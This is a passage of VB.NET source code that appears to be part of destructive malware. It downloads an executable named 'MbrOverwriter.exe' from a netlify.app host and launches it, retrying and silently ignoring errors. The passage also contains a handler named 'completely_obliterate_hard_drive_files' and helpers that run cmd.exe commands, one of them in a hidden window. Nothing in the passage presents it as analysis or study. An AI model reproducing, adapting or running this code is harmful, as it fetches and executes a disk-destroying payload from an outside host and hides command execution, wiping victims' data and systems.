                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", UserFoler & "\MbrOverwriter.exe")
            Catch ex1 As Exception

            End Try
        End Try
        Try
            Process.Start(UserFoler & "\MbrOverwriter.exe")
        Catch ex As Exception
            Try
                Process.Start(UserFoler & "\MbrOverwriter.exe")
            Catch ex1 As Exception
            End Try
        End Try

    End Sub
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                Using stream = client.OpenRead("http://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function

    Private Sub completely_obliterate_hard_drive_files_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles completely_obliterate_hard_drive_files.DoWork

    End Sub
End Class

Public Class MyUtilities
    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub


    Shared Sub RunCommandComInvis(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.WindowStyle = ProcessWindowStyle.Hidden
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub
End Class
